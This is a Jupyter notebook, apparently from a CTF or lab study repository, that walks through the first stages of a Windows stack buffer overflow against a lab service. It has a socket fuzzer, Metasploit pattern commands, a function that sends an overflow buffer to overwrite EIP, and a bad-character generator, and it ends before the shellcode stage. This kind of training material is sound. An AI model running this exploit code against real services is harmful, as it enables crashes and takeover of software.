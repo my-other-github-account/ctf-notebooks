{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "41d01cbd-9f82-4925-ba8a-175fa63f1c1f",
   "metadata": {},
   "source": [
    "# Buffer Overflow Basics:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93e47195-e983-431e-96db-a980442881e4",
   "metadata": {},
   "source": [
    "Crash The Application\n",
    "\n",
    "Find EIP\n",
    "\n",
    "Control ESP\n",
    "\n",
    "Identify Bad Characters\n",
    "\n",
    "Find JMP ESP\n",
    "\n",
    "Generate Shell Code\n",
    "\n",
    "Exploit"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "58afcc77-09ff-40b1-970c-b3ef93aec80e",
   "metadata": {},
   "source": [
    "https://github.com/gh0x0st/Buffer_Overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "669a5c89-3f65-4107-ac64-39d81ce09ab9",
   "metadata": {},
   "source": [
    "# Fuzzing: (Crash App)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54458e64-34b1-482c-b9ba-8251aabba6fd",
   "metadata": {},
   "source": [
    "ip = \"10.10.8.230\"\n",
    "\n",
    "port = 1337\n",
    "timeout = 5\n",
    "prefix = \"OVERFLOW2 \"Run app in Immunity..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "96ea4a7f-af5e-4b5f-86d5-02e44e46b3ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "ip = \"10.10.39.252\"\n",
    "\n",
    "port = 31337\n",
    "timeout = 5\n",
    "prefix = \"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "96f71cee-7458-43b0-b949-2c120a58e2f0",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fuzzing with 100 bytes\n",
      "Fuzzing with 200 bytes\n",
      "Fuzzing with 300 bytes\n",
      "Fuzzing with 400 bytes\n",
      "Fuzzing with 500 bytes\n",
      "Fuzzing with 600 bytes\n",
      "Fuzzing with 700 bytes\n",
      "Fuzzing with 800 bytes\n",
      "Fuzzing with 900 bytes\n",
      "Fuzzing with 1000 bytes\n",
      "Fuzzing with 1100 bytes\n",
      "Fuzzing with 1200 bytes\n",
      "Fuzzing with 1300 bytes\n",
      "Fuzzing with 1400 bytes\n",
      "Fuzzing with 1500 bytes\n",
      "Fuzzing with 1600 bytes\n",
      "Fuzzing with 1700 bytes\n",
      "Fuzzing with 1800 bytes\n",
      "Fuzzing with 1900 bytes\n",
      "Fuzzing with 2000 bytes\n",
      "Fuzzing with 2100 bytes\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR:root:Internal Python error in the inspect module.\n",
      "Below is the traceback from this internal error.\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fuzzing crashed at 2200 bytes\n",
      "Traceback (most recent call last):\n",
      "  File \"/tmp/ipykernel_2302/1253587491.py\", line 12, in <module>\n",
      "    s.recv(1024)\n",
      "socket.timeout: timed out\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/interactiveshell.py\", line 3441, in run_code\n",
      "    exec(code_obj, self.user_global_ns, self.user_ns)\n",
      "  File \"/tmp/ipykernel_2302/1253587491.py\", line 19, in <module>\n",
      "    sys.exit(0)\n",
      "SystemExit: 0\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 1101, in get_records\n",
      "    return _fixed_getinnerframes(etb, number_of_lines_of_context, tb_offset)\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 248, in wrapped\n",
      "    return f(*args, **kwargs)\n",
      "  File \"/root/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\", line 281, in _fixed_getinnerframes\n",
      "    records = fix_frame_records_filenames(inspect.getinnerframes(etb, context))\n",
      "  File \"/root/miniconda/lib/python3.9/inspect.py\", line 1541, in getinnerframes\n",
      "    frameinfo = (tb.tb_frame,) + getframeinfo(tb, context)\n",
      "AttributeError: 'tuple' object has no attribute 'tb_frame'\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "object of type 'NoneType' has no len()",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mtimeout\u001b[0m                                   Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_2302/1253587491.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     11\u001b[0m             \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mconnect\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mip\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mport\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 12\u001b[0;31m             \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1024\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     13\u001b[0m             \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Fuzzing with {} bytes\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstring\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m-\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprefix\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mtimeout\u001b[0m: timed out",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mSystemExit\u001b[0m                                Traceback (most recent call last)",
      "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
      "\u001b[0;32m/tmp/ipykernel_2302/1253587491.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     18\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Fuzzing crashed at {} bytes\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstring\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m-\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprefix\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 19\u001b[0;31m         \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     20\u001b[0m     \u001b[0mstring\u001b[0m \u001b[0;34m+=\u001b[0m \u001b[0;36m100\u001b[0m \u001b[0;34m*\u001b[0m \u001b[0;34m\"A\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mSystemExit\u001b[0m: 0",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mshowtraceback\u001b[0;34m(self, exc_tuple, filename, tb_offset, exception_only, running_compiled_code)\u001b[0m\n\u001b[1;32m   2052\u001b[0m                     stb = ['An exception has occurred, use %tb to see '\n\u001b[1;32m   2053\u001b[0m                            'the full traceback.\\n']\n\u001b[0;32m-> 2054\u001b[0;31m                     stb.extend(self.InteractiveTB.get_exception_only(etype,\n\u001b[0m\u001b[1;32m   2055\u001b[0m                                                                      value))\n\u001b[1;32m   2056\u001b[0m                 \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mget_exception_only\u001b[0;34m(self, etype, value)\u001b[0m\n\u001b[1;32m    752\u001b[0m         \u001b[0mvalue\u001b[0m \u001b[0;34m:\u001b[0m \u001b[0mexception\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    753\u001b[0m         \"\"\"\n\u001b[0;32m--> 754\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mListTB\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstructured_traceback\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    755\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    756\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mshow_exception_only\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, evalue, etb, tb_offset, context)\u001b[0m\n\u001b[1;32m    627\u001b[0m             \u001b[0mchained_exceptions_tb_offset\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    628\u001b[0m             out_list = (\n\u001b[0;32m--> 629\u001b[0;31m                 self.structured_traceback(\n\u001b[0m\u001b[1;32m    630\u001b[0m                     \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0metb\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mchained_exc_ids\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    631\u001b[0m                     chained_exceptions_tb_offset, context)\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1365\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1366\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtb\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1367\u001b[0;31m         return FormattedTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1368\u001b[0m             self, etype, value, tb, tb_offset, number_of_lines_of_context)\n\u001b[1;32m   1369\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1265\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mmode\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mverbose_modes\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1266\u001b[0m             \u001b[0;31m# Verbose modes need a full traceback\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1267\u001b[0;31m             return VerboseTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1268\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb_offset\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mnumber_of_lines_of_context\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1269\u001b[0m             )\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, evalue, etb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1122\u001b[0m         \u001b[0;34m\"\"\"Return a nice text document describing the traceback.\"\"\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1123\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1124\u001b[0;31m         formatted_exception = self.format_exception_as_a_whole(etype, evalue, etb, number_of_lines_of_context,\n\u001b[0m\u001b[1;32m   1125\u001b[0m                                                                tb_offset)\n\u001b[1;32m   1126\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mformat_exception_as_a_whole\u001b[0;34m(self, etype, evalue, etb, number_of_lines_of_context, tb_offset)\u001b[0m\n\u001b[1;32m   1080\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1081\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1082\u001b[0;31m         \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfind_recursion\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0morig_etype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1083\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1084\u001b[0m         \u001b[0mframes\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat_records\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda/lib/python3.9/site-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mfind_recursion\u001b[0;34m(etype, value, records)\u001b[0m\n\u001b[1;32m    380\u001b[0m     \u001b[0;31m# first frame (from in to out) that looks different.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    381\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mis_recursion_error\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 382\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    383\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    384\u001b[0m     \u001b[0;31m# Select filename, lineno, func_name to track frames with\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mTypeError\u001b[0m: object of type 'NoneType' has no len()"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "import socket, time, sys\n",
    "\n",
    "string =  \"A\" * 100\n",
    "\n",
    "while True:\n",
    "    try:\n",
    "        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "            s.settimeout(timeout)\n",
    "            s.connect((ip, port))\n",
    "            s.recv(1024)\n",
    "            print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n",
    "            s.send(bytes(\"WINDOWS\", \"latin-1\"))\n",
    "            s.send(bytes(string, \"latin-1\"))\n",
    "            s.recv(1024)\n",
    "    except:\n",
    "        print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n",
    "        sys.exit(0)\n",
    "    string += 100 * \"A\"\n",
    "    time.sleep(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "3bbc1fd1-67d7-441e-a4b6-97b863fc4ec6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# crash_size = len(string) - len(prefix)\n",
    "\n",
    "crash_size = 300"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c8fcf8a3-d0e6-48f3-a015-1710f66e831f",
   "metadata": {},
   "source": [
    "Ensure EIP is overwritten with AAAAAAAAA!\n",
    "\n",
    "Mona is Windows specific plugin for Immunity Debugger:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "e3112090-b309-4e87-b8ce-4d564fbf83c2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/bin/bash: mona: command not found\n"
     ]
    }
   ],
   "source": [
    "!mona config -set workingfolder c:\\mona\\%p"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edf440c5-8dd0-406c-bd07-a5248feaf837",
   "metadata": {},
   "source": [
    "# Crash Replication, Locating EIP:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6288a135-3c2b-407d-98ea-e64524d745fb",
   "metadata": {},
   "source": [
    "#### Payload: Should *sometimes* be 400 bytes longer than pattern that crashed server\n",
    "\n",
    "(Make sure to insert below)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "40842682-09c2-45dc-8104-33a9b86bc9dc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb\n"
     ]
    }
   ],
   "source": [
    "!locate pattern_create.rb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "d6404f95-d299-4352-8f67-122301b39d6d",
   "metadata": {},
   "outputs": [],
   "source": [
    "crash_padding = 400\n",
    "crash_size_padded = crash_size + crash_padding\n",
    "# payload_sl = !/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {crash_size_padded}\n",
    "# payload_sl = !/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l {crash_size_padded}\n",
    "\n",
    "payload_sl = !/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {crash_size}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "7b2c50bb-6c68-4773-ae2a-ea512bfd603e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload = payload_sl.s\n",
    "\n",
    "payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "b7fb867c-47bc-43ba-82fe-150126b5f579",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import time\n",
    "def run_overflow(payload, prefix=\"\", offset=0, retn=\"\", padding=\"\", target=None):\n",
    "    overflow = \"A\" * offset\n",
    "    postfix = \"\"\n",
    "    \n",
    "    if target is None:\n",
    "        target=ip\n",
    "        \n",
    "    buffer = prefix + overflow + retn + padding + payload + postfix\n",
    "\n",
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "    try:\n",
    "        s.connect((target, port))\n",
    "#         s.recv(1024)\n",
    "        print(\"Sending evil buffer...\")\n",
    "#         s.send(bytes(\"WINDOWS\" +\"\\r\\n\", \"latin-1\"))\n",
    "        \n",
    "        s.send(bytes(buffer, \"latin-1\"))\n",
    "        s.send(bytes(\"\\n\\r\", \"latin-1\"))\n",
    "        time.sleep(1)\n",
    "        print(s.recv(1024))\n",
    "        print(\"Done!\")\n",
    "    except:\n",
    "        print(\"Could not connect.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "48a66899-d478-4e0e-8dcf-4a5495a227db",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Could not connect.\n"
     ]
    }
   ],
   "source": [
    "run_overflow(payload)\n",
    "\n",
    "# run_overflow(\"A\"*100)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "d13f8d5e-43fb-4d74-84fa-207c21f64ccb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona findmsp -distance 700\n"
     ]
    }
   ],
   "source": [
    "!echo !mona findmsp -distance {crash_size_padded}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6cd9a766-978a-4e47-9b42-fa4e54d396be",
   "metadata": {},
   "source": [
    "Alternatively:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "133c3063-ffc9-4d6b-86eb-35d3f494b2d2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Exact match at offset 2012\n"
     ]
    }
   ],
   "source": [
    "# !msf-pattern_offset -l {crash_size} -q <CRASHED EIP>\n",
    "!msf-pattern_offset -l {crash_size} -q 31704330"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "78e9aa24-f91c-40d9-ac9b-31960e662130",
   "metadata": {},
   "source": [
    "### Look for \"EIP Contains Normal Pattern:\" and get offset:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "4999fd54-5b13-490f-9a19-14a0c7795a9e",
   "metadata": {},
   "outputs": [],
   "source": [
    "offset = 146"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ae6fdd2-5ad3-48e0-9fa6-67a2c5606da9",
   "metadata": {},
   "source": [
    "# Controlling EIP (next instruction pointer):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "75e4c699-23f1-4499-b651-2a09a224891f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "b''\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "run_overflow(\"\", offset=offset, retn=\"BBBB\", prefix=\"\") # BBBB is 42424242"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c520975-aa6b-44ec-9bc4-c9804c08be66",
   "metadata": {},
   "source": [
    "Re run in Immunity, verify we can overwrite EIP!\n",
    "\n",
    "EIP should be 42424242\n",
    "\n",
    "Note: ESP is pointer to current stack location, allows us to add data to stack."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c766514f-78df-4e4d-8a45-762b63bebaa9",
   "metadata": {},
   "source": [
    "# Finding Bad Chars:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 221,
   "id": "76b337f4-ee58-49cd-aad4-fe4537295357",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "zsh:1: command not found: mona\n"
     ]
    }
   ],
   "source": [
    "!mona bytearray -b \"\\x00\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "125fa823-8d7e-4aa6-b8c5-a4f5db6d8971",
   "metadata": {},
   "source": [
    "### Generate all possible chars:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "ec7e1b4b-d470-4a44-8ed6-92fe07ccb6ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_goodchars(badchars=\"\"):\n",
    "    bytearray_value = \"\"\n",
    "    \n",
    "    human_readable = bytes(badchars, encoding=\"unicode-escape\").decode(\"ascii\")\n",
    "    badints = [int(x, 16) for x in human_readable.split(\"\\\\\\\\x\")[1:]]\n",
    "    print(human_readable, badints)\n",
    "    \n",
    "    for x in range(1, 256):\n",
    "        if x in badints:\n",
    "            continue\n",
    "        else:\n",
    "            bytearray_value += \"\\\\x\" + \"{:02x}\".format(x)\n",
    "    bytearray_bytes =bytes(bytearray_value, encoding='ascii').decode('unicode_escape')\n",
    "    return bytearray_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "df6fcedc-37ad-4775-99fb-b50f972dc4f5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " []\n",
      "\u0001\u0002\u0003\u0004\u0005\u0006\t\n",
      "\u000e\u000f\u0010\u0011\u0012\u0013\u0014\u0015\u0016\u0017\u0018\u0019\u001a\u001b\u001c",
      "\u001d",
      "\u001e",
      "\u001f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
      " ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ\n"
     ]
    }
   ],
   "source": [
    "bytearray_value = get_goodchars()\n",
    "print(bytearray_value)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a2b9c7d-cbd7-4922-a054-d19f824c0cc5",
   "metadata": {},
   "source": [
    "## Repeat from here!\n",
    "### Run and note ESP location:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "c85bdc65-c759-4851-953a-b7079152fbeb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Could not connect.\n"
     ]
    }
   ],
   "source": [
    "run_overflow(bytearray_value, offset=offset, retn=\"BBBB\", prefix=prefix)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd13b075-e92b-4e27-8a61-42a5ab2e8695",
   "metadata": {},
   "source": [
    "Get ESP Address"
   ]
  },
  {
   "cell_type": "raw",
   "id": "5bd9c4e6-4699-4385-8f21-b9e516ed8584",
   "metadata": {},
   "source": [
    "Note: ESP Location:\n",
    "017619F8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "id": "bcdf0b0b-b09b-426b-9357-c70ff3eb6c10",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
